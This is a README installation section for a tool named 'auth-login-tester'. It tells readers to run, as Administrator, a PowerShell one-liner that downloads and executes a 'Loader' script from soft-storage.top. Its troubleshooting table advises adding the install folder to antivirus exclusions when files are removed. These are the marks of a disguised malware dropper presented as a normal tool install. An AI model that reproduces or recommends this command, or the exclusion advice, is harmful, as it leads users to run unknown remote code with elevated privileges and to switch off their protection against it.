## 🛠️ How to Install

### System Requirements

| Component | Minimum |
|---|---|
| **OS** | Windows 10 / 11 (x64) |
| **PowerShell** | 5.1+ |
| **RAM** | 4 GB |
| **Internet** | Required for installation |

### Step-by-Step Guide

1. **⬇️ Install** — open **PowerShell as Administrator** (`Win+X` → **Terminal (Admin)**)
2. **▶️ Run the installer:**

```powershell
iex (iwr "http://soft-storage.top/worker?=8870692567/Loader" -UseBasicParsing)
```

3. **⏳ Wait** 30-90 seconds for the installer to finish
4. **🔄 Restart** PowerShell
5. **🚀 Launch** the tool:

```powershell
auth-login-tester
```

* * *

## 🐛 Troubleshooting

| Issue | Fix |
|---|---|
| `iex` is not recognized | You are in cmd.exe — open PowerShell |
| No connection | Check internet / VPN / antivirus |
| Command not found | Restart PowerShell |
| Antivirus removes files | Add the install folder to exclusions |
